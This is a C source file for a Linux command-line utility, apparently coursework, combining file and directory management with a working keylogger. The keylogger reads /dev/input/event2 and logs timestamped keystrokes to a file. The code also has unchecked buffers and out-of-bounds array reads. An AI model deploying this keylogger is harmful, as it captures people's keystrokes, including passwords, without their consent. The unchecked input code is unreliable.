#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <linux/input.h>
#include <signal.h>
#include <sys/wait.h>

#define DEVICE_PATH "/dev/input/event2"

int running = 1;

void sigint_handler(int sig) { running = 0; }

void keylogger(const char *logfile) {
    struct input_event ev;
    int fd, logfd;
    char timestamp[64];
    char *map = "..1234567890-=..qwertyuulop{}..asdfghjkl;'...zxcvbnm,./";
    time_t t;
    struct tm *tm_info;

    fd = open(DEVICE_PATH, O_RDONLY);
    if (fd == -1) {
        perror("Failed to open device");
        exit(1);
    }

    logfd = open(logfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (logfd == -1) {
        perror("Failed to open log file");
        exit(1);
    }

    while (running) {
        read(fd, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 1) { // Key press event
            t = time(NULL);
            tm_info = localtime(&t);
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
            dprintf(logfd, "[%s] Key %i pressed\n", timestamp, map[ev.code]);
        }
    }

    close(fd);
    close(logfd);
}

void file_operations();
void directory_operations();
void start_keylogger();
void stop_keylogger();
void print_menu();

void execute_command(int mode, int operation, char *arg1, char *arg2);

int main(int argc, char *argv[]) {
    signal(SIGINT, sigint_handler);

    // Command-line mode
    if (argc > 1 && strcmp(argv[1], "-m") == 0) {
        if (argc < 4) {
            fprintf(stderr, "Usage: ./supercommand -m <mode> <operation> [<args>]\n");
            return 1;
        }

        int mode = atoi(argv[2]);
        int operation = atoi(argv[3]);
        char *arg1 = argc > 4 ? argv[4] : NULL;
        char *arg2 = argc > 5 ? argv[5] : NULL;

        execute_command(mode, operation, arg1, arg2);
        return 0;
    }

    // Interactive menu mode
    int choose;
    while (1) {
        print_menu();
        printf("Enter your choice: ");
        if (scanf("%d", &choose) != 1) {
            printf("Invalid input! Please enter a number.\n");
            while (getchar() != '\n'); // Clear invalid input
            continue;
        }

        switch (choose) {
            case 1:
                file_operations();
                break;
            case 2:
                directory_operations();
                break;
            case 3:
                start_keylogger();
                break;
            case 4:
                stop_keylogger();
                break;
            case 0:
                stop_keylogger();
                printf("Exiting program.\n");
                exit(0);
            default:
                printf("Invalid choice! Please try again.\n");
        }
    }

    return 0;
}

void execute_command(int mode, int operation, char *arg1, char *arg2) {
    switch (mode) {
        case 1: // File operations
            if (operation == 1 && arg1) { // Create/Open File
                FILE *file = fopen(arg1, "w+");
                if (file) {
                    printf("File '%s' created/opened successfully.\n", arg1);
                    fclose(file);
                } else {
                    perror("Error creating/opening file");
                }
            } else {
                printf("Invalid file operation or arguments.\n");
            }
            break;

        case 2: // Directory operations
            if (operation == 1 && arg1) { // List Directory Contents
                DIR *dir = opendir(arg1);
                struct dirent *entry;
                if (dir) {
                    printf("Directory contents:\n");
                    while ((entry = readdir(dir)) != NULL) {
                        printf("%s\n", entry->d_name);
                    }
                    closedir(dir);
                } else {
                    perror("Error opening directory");
                }
            } else {
                printf("Invalid directory operation or arguments.\n");
            }
            break;

        case 3: // Keylogger
            if (operation == 1 && arg1) {
                printf("Starting keylogger and writing to '%s'.\n", arg1);
                keylogger(arg1);
            } else {
                printf("Invalid keylogger operation or arguments.\n");
            }
            break;

        default:
            printf("Invalid mode or operation.\n");
    }
}

void print_menu() {
    printf("\n--- SuperCommand Menu ---\n");
    printf("1. File Operations\n");
    printf("2. Directory Operations\n");
    printf("3. Start Keylogger\n");
    printf("4. Stop Keylogger\n");
    printf("0. Exit\n");
    printf("-------------------------\n");
}

pid_t keylogger_pid = 0;
void start_keylogger() {
    if (keylogger_pid == 0) {
        keylogger_pid = fork();
        if (keylogger_pid == 0) {
            keylogger("keylog_enhanced.txt");
            exit(0);
        } else if (keylogger_pid > 0) {
            printf("Keylogger started.\n");
        } else {
            perror("Failed to start keylogger");
        }
    } else {
        printf("Keylogger is already running.\n");
    }
}

void stop_keylogger() {
    if (keylogger_pid != 0) {
        kill(keylogger_pid, SIGINT);
        waitpid(keylogger_pid, NULL, 0);
        keylogger_pid = 0;
        printf("Keylogger stopped.\n");
    } else {
        printf("Keylogger is not running.\n");
    }
}

//Function to handle file related tasks
void file_operations() {
    int fchoice;
    char filename[256], fcontent[1024];
    FILE *file;
    mode_t mode;

    printf("\n--- File Operations Menu ---\n");
    printf("1. Create/Open a File\n");
    printf("2. Change File Permissions\n");
    printf("3. Read from File\n");
    printf("4. Write to File\n");
    printf("5. Delete a File\n");
    printf("0. Back to Main Menu\n");
    printf("-----------------------------\n");
    printf("Enter your choice: ");
    scanf("%d", &fchoice);

    switch (fchoice) {
        case 1: // Create/Open File
            printf("Enter file name: ");
            scanf("%s", filename);
            file = fopen(filename, "w+");
            if (file) {
                printf("File '%s' created/opened successfully.\n", filename);
                fclose(file);
            } else {
                perror("Error creating/opening file");
            }
            break;

        case 2: // Change File Permissions
            printf("Enter file name: ");
            scanf("%s", filename);
            printf("Enter permission mode (e.g., 0777): ");
            scanf("%o", &mode);
            if (chmod(filename, mode) == 0) {
                printf("Permissions changed successfully for file '%s'.\n", filename);
            } else {
                perror("Error changing permissions");
            }
            break;

        case 3: // Read from File
            printf("Enter file name: ");
            scanf("%s", filename);          //Get file name from user
            file = fopen(filename, "r");
            if (file) {
                printf("File content:\n");
                while (fgets(fcontent, sizeof(fcontent), file)) {     //read file line by line
                    printf("%s", fcontent);
                }
                fclose(file);
            } else {
                perror("Error reading file");
            }
            break;

        case 4: // Write to File
            printf("Enter file name: ");
            scanf("%s", filename);
            printf("Enter content to write: ");
            getchar(); // To consume newline left in buffer
            fgets(fcontent, sizeof(fcontent), stdin);   //Get input from user
            file = fopen(filename, "a");
            if (file) {
                fputs(fcontent, file);   //Write file content
                printf("Content written to file '%s'.\n", filename);
                fclose(file);
            } else {
                perror("Error writing to file");
            }
            break;

        case 5: // Delete File
            printf("Enter file name: ");
            scanf("%s", filename);
            if (remove(filename) == 0) {
                printf("File '%s' deleted successfully.\n", filename);
            } else {
                perror("Error deleting file");
            }
            break;

        case 0:
            return;

        default:
            printf("Invalid choice! Please try again.\n");
    }
}

//Function to handle directory related tasks
void directory_operations() {
    int dchoice;
    char dirname[256];
    DIR *dir;
    struct dirent *entry;
    char cwd[1024];

    printf("\n--- Directory Operations Menu ---\n");
    printf("1. Create Directory\n");
    printf("2. Remove Directory\n");
    printf("3. Print Current Working Directory\n");
    printf("4. List Directory Contents\n");
    printf("0. Back to Main Menu\n");
    printf("-----------------------------\n");
    printf("Enter your choice: ");
    scanf("%d", &dchoice);

    switch (dchoice) {
        case 1: // Create Directory
            printf("Enter directory name: ");
            scanf("%s", dirname);
            if (mkdir(dirname, 0777) == 0) {
                printf("Directory '%s' created successfully.\n", dirname);
            } else {
                perror("Error creating directory");
            }
            break;

        case 2: // Remove Directory
            printf("Enter directory name: ");
            scanf("%s", dirname);             //Get directory name from user
            if (rmdir(dirname) == 0) {
                printf("Directory '%s' removed successfully.\n", dirname);
            } else {
                perror("Error removing directory");
            }
            break;

        case 3: // Print Current Working Directory
            if (getcwd(cwd, sizeof(cwd)) != NULL) {          //get current directory
                printf("Current working directory: %s\n", cwd);
            } else {
                perror("Error getting current directory");
            }
            break;

        case 4: // List Directory Contents
            printf("Enter directory path (or '.' for current directory): ");
            scanf("%s", dirname);     //get directory path from user
            dir = opendir(dirname);   //open directory
            if (dir) {
                printf("Directory contents:\n");
                while ((entry = readdir(dir)) != NULL) {     //ready entry
                    printf("%s\n", entry->d_name);          //print entry
                }
                closedir(dir);
            } else {
                perror("Error opening directory");
            }
            break;

        case 0:
            return;

        default:
            printf("Invalid choice! Please try again.\n");
    }
}
